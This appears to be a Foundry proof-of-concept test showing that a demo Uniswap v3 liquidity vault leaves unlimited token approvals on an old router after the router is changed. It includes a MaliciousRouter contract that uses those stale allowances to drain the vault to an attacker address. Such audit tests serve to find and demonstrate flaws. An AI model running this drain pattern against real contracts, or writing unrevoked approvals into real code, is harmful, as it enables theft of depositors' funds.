// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "forge-std/Test.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";

import "../src/PoolLauncher.sol";
import "../src/TestToken.sol";
import "../src/CLM.sol"; // file that contains `contract DemoCLMVault`

// Simple malicious router that uses its allowance to drain tokens
contract MaliciousRouter {
    function drain(address token, address from, address to) external {
        uint256 bal = IERC20(token).balanceOf(from);
        IERC20(token).transferFrom(from, to, bal);
    }
}

contract CLMAttacksTest is Test {
    // ---- Mainnet Uniswap v3 addresses ----
    // Factory (Ethereum mainnet)
    address constant UNISWAP_V3_FACTORY =
        0x1F98431c8aD98523631AE4a59f267346ea31F984;

    // NonfungiblePositionManager (Ethereum mainnet)
    address constant NONFUNGIBLE_POSITION_MANAGER =
        0xC36442b4a4522E871399CD717aBDD847Ab11FE88;

    // Uniswap V3 SwapRouter (Ethereum mainnet)
    address constant UNISWAP_V3_SWAP_ROUTER =
        0xE592427A0AEce92De3Edee1F18E0157C05861564;

    PoolLauncher public poolLauncher;
    TestToken public token0;
    TestToken public token1;
    DemoCLMVault public vault;
    IUniswapV3Pool public pool;

    function setUp() public {
        // --- fork mainnet ---
        string memory rpcUrl = vm.envString("MAINNET_RPC_URL");
        uint256 forkId = vm.createFork(rpcUrl);
        vm.selectFork(forkId);

        // deploy helper to create a Uniswap v3 pool
        poolLauncher = new PoolLauncher(UNISWAP_V3_FACTORY);

        // deploy two custom ERC20s
        token0 = new TestToken("Vault Token 0", "VT0");
        token1 = new TestToken("Vault Token 1", "VT1");

        // initialize pool at ~1:1 price (both 18 decimals)
        uint160 sqrtPriceX96 = poolLauncher.calculateSqrtPriceX96(
            1e18, // price
            18,   // decimals0
            18    // decimals1
        );

        address poolAddr = poolLauncher.createAndInitializePool(
            address(token0),
            address(token1),
            3000,        // 0.3% fee
            sqrtPriceX96
        );
        pool = IUniswapV3Pool(poolAddr);

        // deploy CLM vault
        // initial unirouter can be the real router; we'll swap it later
        vault = new DemoCLMVault(
            address(this),                // admin
            address(token0),
            address(token1),
            address(pool),
            NONFUNGIBLE_POSITION_MANAGER,
            UNISWAP_V3_SWAP_ROUTER
        );
    }

    /// @notice Demonstrates the "stale router approval" bug:
    ///         1. Vault gives unlimited approval to old router (malicious).
    ///         2. Admin updates router via setUnirouter(newRouter) WITHOUT revoking.
    ///         3. Liquidity is removed, tokens sit in vault.
    ///         4. Old router still has allowance and drains all tokens.
    function test_AttackerDrainsVaultViaStaleRouterApproval() public {
        // ---- actors ----
        address user = address(0xBEEF);
        address attacker = address(0xA11CE);

        // deploy a malicious router
        MaliciousRouter maliciousRouter = new MaliciousRouter();

        // admin sets unirouter = maliciousRouter
        vault.setUnirouter(address(maliciousRouter));

        // ---- user deposits into the vault ----
        uint256 amount0 = 1_000 ether;
        uint256 amount1 = 1_000 ether;

        // mint tokens to user
        token0.mint(user, amount0);
        token1.mint(user, amount1);

        vm.startPrank(user);
        token0.approve(address(vault), amount0);
        token1.approve(address(vault), amount1);
        vault.deposit(amount0, amount1);
        vm.stopPrank();

        // At this point, vault holds user tokens directly.

        // ---- admin calls unpause() to "set things up" ----
        // This will:
        //  - call _giveAllowances() and give unlimited approvals to maliciousRouter
        //  - compute ticks from slot0
        //  - add all vault balances as Uniswap liquidity (currentPositionId != 0)
        vault.unpause();

        // Now:
        //  - maliciousRouter has unlimited allowance on token0 & token1 from vault
        //  - user funds are in the LP position

        // ---- admin "upgrades" router to a new address (but DOES NOT revoke old approvals) ----
        address newRouter = address(0x1234);
        vault.setUnirouter(newRouter);

        // Approvals for maliciousRouter are still in place.

        // ---- later, admin decides to pause the strategy ----
        // This removes all Uniswap liquidity back into the vault.
        vault.pause();

        // vault now holds the tokens again, but maliciousRouter still has allowances.
        uint256 vaultToken0Before = token0.balanceOf(address(vault));
        uint256 vaultToken1Before = token1.balanceOf(address(vault));
        assertGt(vaultToken0Before + vaultToken1Before, 0, "vault should hold tokens before attack");

        uint256 attackerToken0Before = token0.balanceOf(attacker);
        uint256 attackerToken1Before = token1.balanceOf(attacker);

        // ---- attacker triggers the old router to drain funds using stale allowance ----
        // Note: When we call maliciousRouter.drain, msg.sender for the ERC20 is maliciousRouter,
        //       which is exactly the address that the vault approved in _giveAllowances().
        maliciousRouter.drain(address(token0), address(vault), attacker);
        maliciousRouter.drain(address(token1), address(vault), attacker);

        uint256 vaultToken0After = token0.balanceOf(address(vault));
        uint256 vaultToken1After = token1.balanceOf(address(vault));

        uint256 attackerToken0After = token0.balanceOf(attacker);
        uint256 attackerToken1After = token1.balanceOf(attacker);

        // ---- assertions: vault drained, attacker enriched ----
        assertEq(vaultToken0After, 0, "vault token0 should be fully drained");
        assertEq(vaultToken1After, 0, "vault token1 should be fully drained");

        assertEq(
            attackerToken0After,
            attackerToken0Before + vaultToken0Before,
            "attacker token0 profit mismatch"
        );
        assertEq(
            attackerToken1After,
            attackerToken1Before + vaultToken1Before,
            "attacker token1 profit mismatch"
        );
    }
}
